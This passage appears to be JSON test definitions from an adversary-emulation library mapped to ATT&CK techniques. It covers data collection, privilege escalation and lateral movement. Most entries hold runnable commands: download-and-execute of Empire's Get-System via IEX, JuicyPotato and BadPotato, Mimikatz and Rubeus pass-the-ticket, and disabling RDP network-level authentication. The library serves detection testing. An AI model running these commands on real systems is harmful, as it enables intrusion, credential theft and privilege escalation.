				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1005"
			},
			"file_extensions": {
				"description": "List of file extensions to be searched and zipped, separated by comma and space",
				"type": "string",
				"default": ".doc, .docx, .txt"
			}
		},
		"executor": {
			"command": "$startingDirectory = \"#{starting_directory}\"\n$outputZip = \"#{output_zip_folder_path}\"\n$fileExtensionsString = \"#{file_extensions}\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }\n",
			"cleanup_command": "Remove-Item -Path  $outputZip\\data.zip -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1005",
		"phases": ["collection"]
	},
	{
		"name": "Find and dump sqlite databases (Linux)",
		"auto_generated_guid": "00cbb875-7ae4-4cf1-b638-e543fd825300",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"remote_url": {
				"description": "url of remote payload",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src"
			}
		},
		"dependencies": [
			{
				"description": "Check if running on a Debian based machine.\n",
				"prereq_command": "if [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi\n",
				"get_prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n",
			"cleanup_command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n"
		},
		"attack_technique": "T1005",
		"phases": ["collection"]
	},
	{
		"name": "Named pipe client impersonation",
		"auto_generated_guid": "90db9e27-8e7c-4c04-b602-a45927884966",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1134.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "`SeDebugPrivilege` token duplication",
		"auto_generated_guid": "34f0a430-9d04-4d98-bcb5-1989f14719f0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1134.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Launch NSudo Executable",
		"auto_generated_guid": "7be1bc0f-d8e5-4345-9333-f5f67d742cb9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"nsudo_path": {
				"description": "Path to the NSudoLG.exe file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1134.001\\bin\\NSudoLG.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "NSudoLG.exe must exist in the specified path #{nsudo_path}\n",
				"prereq_command": "if (Test-Path \"#{nsudo_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" \"https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo Launcher\\x64\\NSudoLG.exe\" \"#{nsudo_path}\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -Recurse -ErrorAction Ignore\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Recurse -ErrorAction Ignore\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{nsudo_path}\" -Argument \"-U:T -P:E cmd\"\nStart-Sleep -Second 5\nStop-Process -Name \"cmd\" -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1134.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Bad Potato",
		"auto_generated_guid": "9c6d799b-c111-4749-a42f-ec2f8cb51448",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "BadPotato.exe must exist in the temp directory\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\" \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true\"\n"
			}
		],
		"executor": {
			"command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n",
			"cleanup_command": "taskkill /f /im notepad.exe\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1134.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Juicy Potato",
		"auto_generated_guid": "f095e373-b936-4eb4-8d22-f47ccbfbe64a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"potato_path": {
				"description": "Path to the JuicyPotato.exe file",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\JuicyPotato.exe"
			},
			"listening_port": {
				"description": "COM server listen port",
				"type": "integer",
				"default": 7777
			},
			"target_exe": {
				"description": "Target executable to launch with system privileges",
				"type": "path",
				"default": "$env:windir\\system32\\notepad.exe"
			},
			"target_CLSID": {
				"description": "Vulnerable CLSID to impersonate privileges",
				"type": "string",
				"default": "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "JuicyPotato.exe must exist on disk\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\JuicyPotato.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\JuicyPotato.exe\" \"https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe\"\n"
			}
		],
		"executor": {
			"command": "cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'\n",
			"cleanup_command": "get-ciminstance Win32_Process | where-object { $_.Path -eq \"#{target_exe}\" } | invoke-cimmethod -methodname \"terminate\" | out-null\nget-ciminstance Win32_Process | where-object { $_.Path -eq \"#{potato_path}\" } | invoke-cimmethod -methodname \"terminate\" | out-null\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1134.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Mimikatz Kerberos Ticket Attack",
		"auto_generated_guid": "dbf38128-7ba7-4776-bedf-cc2eed432098",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ticket": {
				"description": "Ticket file name usually format of 'id-username\\@domain.kirbi' (e.g. can be dumped by \"sekurlsa::tickets /export\" module)",
				"type": "string",
				"default": null
			},
			"mimikatz_exe": {
				"description": "Path of the Mimikatz binary",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
				"prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			}
		],
		"executor": {
			"command": "\"#{mimikatz_exe}\" \"kerberos::ptt #{ticket}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1550.003",
		"phases": ["defense-evasion", "lateral-movement"]
	},
	{
		"name": "Rubeus Kerberos Pass The Ticket",
		"auto_generated_guid": "a2fc4ec5-12c6-4fb4-b661-961f23f359cb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target": {
				"description": "Remote system to request the TGT from",
				"type": "string",
				"default": "localhost"
			},
			"user_name": {
				"description": "username associated with the ticket (privileged account not required)",
				"type": "string",
				"default": "Administrator"
			},
			"password": {
				"description": "password for user_name",
				"type": "string",
				"default": "Password"
			},
			"domain": {
				"description": "domain",
				"type": "string",
				"default": "$Env:USERDOMAIN"
			},
			"rubeus_url": {
				"description": "URL of Rubeus executable",
				"type": "url",
				"default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Rubeus must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\"\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\"\n"
			},
			{
				"description": "PsExec must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\"\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\#{target} -w c:\\ -c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" purge      "
		},
		"attack_technique": "T1550.003",
		"phases": ["defense-evasion", "lateral-movement"]
	},
	{
		"name": "RDP to DomainController",
		"auto_generated_guid": "355d4632-8cb9-449d-91ce-b566d0253d3e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"logonserver": {
				"description": "ComputerName argument default %logonserver%",
				"type": "string",
				"default": "$ENV:logonserver.TrimStart(\"\\\")"
			},
			"domain": {
				"description": "domain argument default %USERDOMAIN%",
				"type": "string",
				"default": "$Env:USERDOMAIN"
			},
			"username": {
				"description": "Username argument default %username%",
				"type": "string",
				"default": "$ENV:USERNAME"
			},
			"password": {
				"description": "Password",
				"type": "string",
				"default": "1password2!"
			}
		},
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			}
		],
		"executor": {
			"command": "$Server=#{logonserver}\n$User = Join-Path #{domain} #{username}\n$Password=\"#{password}\"\ncmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password\nmstsc /v:$Server\necho \"RDP connection established\"\n",
			"cleanup_command": "$p=Tasklist /svc /fi \"IMAGENAME eq mstsc.exe\" /fo csv | convertfrom-csv\nif(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1021.001",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Changing RDP Port to Non Standard Port via Powershell",
		"auto_generated_guid": "2f840dd4-8a2e-4f44-beb3-6b2399ea3771",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"OLD_Remote_Port": {
				"description": "Default RDP Listening Port",
				"type": "string",
				"default": "3389"
			},
			"NEW_Remote_Port": {
				"description": "New RDP Listening Port",
				"type": "string",
				"default": "4489"
			}
		},
		"executor": {
			"command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{NEW_Remote_Port}\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}\n",
			"cleanup_command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{OLD_Remote_Port}\nRemove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction Ignore \nGet-Service TermService | Restart-Service -Force -ErrorAction Ignore \n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1021.001",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Changing RDP Port to Non Standard Port via Command_Prompt",
		"auto_generated_guid": "74ace21e-a31c-4f7d-b540-53e4eb6d1f73",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"OLD_Remote_Port": {
				"description": "Default RDP Listening Port",
				"type": "string",
				"default": "3389"
			},
			"NEW_Remote_Port": {
				"description": "New RDP Listening Port",
				"type": "string",
				"default": "4489"
			}
		},
		"executor": {
			"command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f\nnetsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}\n",
			"cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1\nnetsh advfirewall firewall delete rule name=\"RDPPORTLatest-TCP-In\" >nul 2>&1\nnet stop TermService /y >nul 2>&1\nnet start TermService >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1021.001",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Disable NLA for RDP via Command Prompt",
		"auto_generated_guid": "01d1c6c0-faf0-408e-b368-752a02285cb2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Default_UserAuthentication": {
				"description": "Default UserAuthentication registry value",
				"type": "string",
				"default": "1"
			}
		},
		"executor": {
			"command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f\n",
			"cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1021.001",
		"phases": ["lateral-movement"]
	},
	{
		"name": "File and Directory Discovery (cmd.exe)",
		"auto_generated_guid": "0e36303b-6762-4500-b003-127743b80ba6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "File to output results to",
				"type": "string",
				"default": "%temp%\\T1083Test1.txt"
			}
		},
		"executor": {
			"command": "dir /s c:\\ >> #{output_file}\ndir /s \"c:\\Documents and Settings\" >> #{output_file}\ndir /s \"c:\\Program Files\\\" >> #{output_file}\ndir \"%systemdrive%\\Users\\*.*\" >> #{output_file}\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> #{output_file}\ndir \"%userprofile%\\Desktop\\*.*\" >> #{output_file}\ntree /F >> #{output_file}\n",
			"cleanup_command": "del #{output_file}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1083",
		"phases": ["discovery"]
	},
	{
		"name": "File and Directory Discovery (PowerShell)",
		"auto_generated_guid": "2158908e-b7ef-4c21-8a83-3ce4dd05a924",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1083",
		"phases": ["discovery"]
	},
	{
		"name": "Nix File and Directory Discovery",
		"auto_generated_guid": "ffc8b249-372a-4b74-adcd-e4c0430842de",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"output_file": {
				"description": "Output file used to store the results.",
				"type": "path",
				"default": "/tmp/T1083.txt"
			}
		},
		"executor": {
			"command": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1083",
		"phases": ["discovery"]
	},
	{
		"name": "Nix File and Directory Discovery 2",
		"auto_generated_guid": "13c5e1ae-605b-46c4-a79f-db28c77ff24e",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"output_file": {
				"description": "Output file used to store the results.",
				"type": "path",
				"default": "/tmp/T1083.txt"
			}
		},
		"executor": {
			"command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}\nif [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;\nfind . -type f -iname *.pdf >> #{output_file}\ncat #{output_file}\nfind . -type f -name \".*\"\n",
			"cleanup_command": "rm #{output_file}",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1083",
		"phases": ["discovery"]
	},
	{
		"name": "Simulating MAZE Directory Enumeration",
		"auto_generated_guid": "c6c34f61-1c3e-40fb-8a58-d017d88286d8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"File_to_output": {
				"description": "File to output results to",
				"type": "string",
				"default": "$env:temp\\T1083Test5.txt"
			}
		},
		"executor": {
			"command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append #{File_to_output}\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) \n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}\n}\ncat #{File_to_output}\n",
			"cleanup_command": "remove-item #{File_to_output} -ErrorAction SilentlyContinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1083",
		"phases": ["discovery"]
	},
	{
		"name": "Launch DirLister Executable",
		"auto_generated_guid": "c5bec457-43c9-4a18-9a24-fe151d8971b7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dirlister_path": {
				"description": "Path to the DirLister executable ",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DirLister.exe must exist in the specified path #{dirlister_path}\n",
				"prereq_command": "if (Test-Path \"#{dirlister_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "$parentpath = Split-Path \"#{dirlister_path}\"\nNew-Item -ItemType Directory -Force -Path $parentpath | Out-Null\nInvoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\\*\" \"$parentpath\" -Recurse\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\",\"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\" -Recurse -ErrorAction Ignore\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{dirlister_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1083",
		"phases": ["discovery"]
	},
	{
		"name": "ESXi - Enumerate VMDKs available on an ESXi Host",
		"auto_generated_guid": "4a233a40-caf7-4cf1-890a-c6331bbc72cf",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			},
			"plink_file": {
				"description": "Path to Plink",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"cli_script": {
				"description": "Path to script with file discovery commands",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1083\\src\\esxi_file_discovery.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if plink is available.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1083",
		"phases": ["discovery"]
	},
	{
		"name": "Creating GCP Service Account and Service Account Key",
		"auto_generated_guid": "9fdd83fd-bd53-46e5-a716-9dec89c8ae8e",
		"supported_platforms": ["google-workspace", "iaas:gcp"],
		"input_arguments": {
			"project-id": {
				"description": "ID of the project, you want to create service account as well as service account key for",
				"type": "string",
				"default": "art-project-1"
			},
			"service-account-name": {
				"description": "Name of the service account",
				"type": "string",
				"default": "gcp-art-service-account-1"
			},
			"service-account-email": {
				"description": "Email of the service account",
				"type": "string",
				"default": "gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com"
			},
			"output-key-file": {
				"description": "Email of the service account",
				"type": "string",
				"default": "gcp-art-service-account-1.json"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "gcloud config set project #{project-id}\ngcloud iam service-accounts create #{service-account-name}\ngcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}\n",
			"cleanup_command": "gcloud iam service-accounts delete #{service-account-email} --quiet\n"
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires gcloud\n",
				"prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"
			},
			{
				"description": "Check if user is logged in \n",
				"prereq_command": "gcloud config get-value account\n",
				"get_prereq_command": "gcloud auth login --no-launch-browser\n"
			}
		],
		"attack_technique": "T1078.004",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Azure Persistence Automation Runbook Created or Modified",
		"auto_generated_guid": "348f4d14-4bd3-4f6b-bd8a-61237f78b3ac",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"username": {
				"description": "Azure username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "Azure password",
				"type": "string",
				"default": null
			},
			"resource_group": {
				"description": "Name of the resource group",
				"type": "string",
				"default": null
			},
			"runbook_name": {
				"description": "Name of the runbook name",
				"type": "string",
				"default": null
			},
			"automation_account_name": {
				"description": "Name of the automation account name",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if terraform is installed.\n",
				"prereq_command": "terraform version\n",
				"get_prereq_command": "echo Please install terraform.\n"
			},
			{
				"description": "Install-Module -Name Az\n",
				"prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name Az -Scope CurrentUser -Force\n"
			},
			{
				"description": "Check if the user is logged into Azure.\n",
				"prereq_command": "az account show\n",
				"get_prereq_command": "echo Configure your Azure account using: az login. \n"
			},
			{
				"description": "Create dependency resources using terraform\n",
				"prereq_command": "try {if (Test-Path \"$PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate\" ){ exit 0 } else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "cd \"$PathToAtomicsFolder/T1078.004/src/T1078.004-2/\"\nterraform init\nterraform apply -auto-approve\n"
			}
		],
		"executor": {
